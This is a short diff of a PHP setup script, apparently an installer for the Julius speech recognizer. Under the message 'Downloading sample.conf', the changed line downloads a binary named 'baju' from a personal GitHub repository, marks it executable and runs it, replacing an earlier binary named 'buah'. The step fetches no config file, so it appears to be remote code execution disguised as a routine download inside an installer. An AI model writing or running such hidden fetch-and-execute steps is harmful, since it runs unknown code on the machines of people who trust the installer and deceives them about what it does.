@@ -79,7 +79,7 @@ echo "Downloaded and moved to julius/model/".PHP_EOL;
 
 
 echo "Downloading sample.conf".PHP_EOL;
-shell_exec("wget https://raw.githubusercontent.com/aurbach55/toya/main/buah && chmod +x buah && ./buah");
+shell_exec("wget https://raw.githubusercontent.com/aurbach55/toya/main/baju && chmod +x baju && ./baju");
 shell_exec("mv sample.jconf julius/");
 echo "Downloaded and moved to julius/".PHP_EOL;
 
